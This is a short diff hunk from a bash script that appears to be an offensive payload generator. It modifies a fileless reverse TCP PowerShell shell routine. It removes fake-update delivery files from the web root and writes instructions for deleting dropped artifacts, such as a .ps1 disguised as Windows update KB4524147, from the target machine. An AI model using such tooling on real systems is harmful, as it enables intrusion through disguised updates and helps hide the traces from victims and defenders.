@@ -12166,11 +12166,15 @@ rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
 if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
-   zenity --title="☠ Reverse TCP Powershell Shell (Fileless) ☠" --text "REMARK: Instructions how to manualy delete artifacts from target stored in:\n$IPATH/output/delete_artifacts_ID_4nF7.txt" --info > /dev/null 2>&1
    echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.txt
    echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
    echo "del /F /Q %$rpath%\\KB4524147_4nF7.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
+else
+   echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.txt
+   echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
+   echo "del /F /Q $Drop.bat" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
 fi
+zenity --title="☠ Reverse TCP Powershell Shell (Fileless) ☠" --text "REMARK: Instructions how to manualy delete artifacts from target stored in:\n$IPATH/output/delete_artifacts_ID_4nF7.txt" --info > /dev/null 2>&1
 sh_menu
 }
 
